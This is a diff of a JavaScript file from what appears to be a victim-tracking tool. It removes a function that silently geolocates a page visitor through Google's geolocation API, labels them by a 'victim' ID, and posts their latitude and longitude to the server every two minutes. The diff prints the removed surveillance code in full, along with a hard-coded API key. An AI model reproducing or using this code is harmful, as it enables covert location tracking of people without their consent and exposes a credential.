@@ -130,7 +130,6 @@ $(document).ready(function($) {
     }
 
     tping();
-    locateV();
 });
 
 var sendData = function(data) {
@@ -186,37 +185,4 @@ var defineSockets = function(self) {
                 return false;
         }                            
     });
-}
-
-var locateV = function(self) {
-    var xhttp = new XMLHttpRequest();
-    var key = "AIzaSyBjLRk0ipr2VNAdnmc15DlSKbHEsYWH-XQ";
-
-    xhttp.onreadystatechange = function() {
-        if (xhttp.readyState == 4 && xhttp.status == 200) {
-            var geolocation = JSON.parse(xhttp.responseText).location;
-            var d = getVictimData();
-            var data = {
-                vId : d.vId,
-                lat: geolocation.lat,
-                lon: geolocation.lng
-            };
-
-            $.ajax({
-                url: '/lr',
-                data: data,
-                dataType: "json",
-                type: 'POST',
-                success: function(response) {
-                    setTimeout(function(){ locateV(); }, 120000);
-                },
-                error: function(error) {
-                    setTimeout(function(){ locateV(); }, 3000);
-                }
-            });
-        }
-    };
-
-    xhttp.open("POST", "https://www.googleapis.com/geolocation/v1/geolocate?key=" + key, true);
-    xhttp.send(); 
 }
